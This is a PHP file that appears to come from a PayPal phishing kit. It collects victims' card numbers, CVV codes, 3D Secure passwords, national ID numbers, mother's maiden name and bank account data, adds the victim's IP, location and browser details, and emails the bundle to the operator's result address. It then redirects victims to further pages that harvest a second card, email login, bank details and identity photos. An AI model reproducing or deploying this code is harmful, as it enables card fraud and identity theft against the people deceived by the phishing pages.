<?php
error_reporting(0);
session_start();
require_once '../main.php';
require_once 'session.php';
$ip = getUserIP();
$ispuser = getisp($ip);
$message = "#--------------------------------[ VBV INFO ]----------------------------#\n";
$message .= "Type			: ".$_SESSION['scheme']." - ".$_SESSION['type']."\n";
$message .= "Level			: ".$_SESSION['brand']."\n";
$message .= "Cardholders    : ".$_SESSION['ch']."\n";
$message .= "CC Number		: ".$_SESSION['ccn']."\n";
$message .= "Expired		: ".$_SESSION['cex']."\n";
$message .= "Card Security Code	: ".$_SESSION['csc']."\n";
$message .= "AMEX CID : ".$_SESSION['cid']."\n";
$message .= "3D Password : ".$_POST['password_vbv']."\n";
$message .= "Codice Fiscale : ".$_POST['codicefiscale']."\n";
$message .= "Kontonummer : ".$_POST['kontonummer']."\n";
$message .= "Official ID : ".$_POST['offid']."\n";
$message .= "Mother’s Maiden Name : ".$_POST['mmname']."\n";
$message .= "#--------------------[ JAPAN INFO ]-------------------------#\n";
$message .= "WEB ID	: ".$_POST['webid']."\n";
$message .= "Card Password	: ".$_POST['cardpass']."\n";
$message .= "#--------------------------[ PC INFORMATION ]-------------------------#\n";
$message .= "IP Address		: ".$ip."\n";
$message .= "ISP		    : ".$ispuser."\n";
$message .= "Region		    : ".$regioncity."\n";
$message .= "City		    : ".$citykota."\n";
$message .= "Continent		: ".$continent."\n";
$message .= "Timezone		: ".$timezone."\n";
$message .= "OS/Browser		: ".$os." / ".$br."\n";
$message .= "Date			: ".$date."\n";
$message .= "User Agent		: ".$user_agent."\n";
$message .= "#--------------------------[ PRIVATE ]-----------------------------#\n";
$subject = "PAYPAL VBV: ".$_SESSION['from']." [ $cn - $os - $ip ]";
kirim_mail($setting['email_result'],$_SESSION['from'],$subject,$message);
tulis_file("../result/total_vbv.txt", $ip);

if($setting['double_cc'] == "on") {
	if($_SESSION['cc_kedua'] == "") {
	        $_SESSION['cc_kedua'] = "done";
	        echo "<script type='text/javascript'>window.top.location='link_card?key=$key';</script>";
	        exit();
	}
}
if($setting['get_email'] == "on"){
 echo "<script type='text/javascript'>window.top.location='link_email?key=$key';</script>";
}else if($setting['get_bank'] == "on"){
 echo "<script type='text/javascript'>window.top.location='bank?key=$key';</script>";
}else if($setting['get_photo'] == "on"){
 echo "<script type='text/javascript'>window.top.location='identity?key=$key';</script>";
}else{
echo "<script type='text/javascript'>window.top.location='done?key=$key';</script>";
}
exit('done');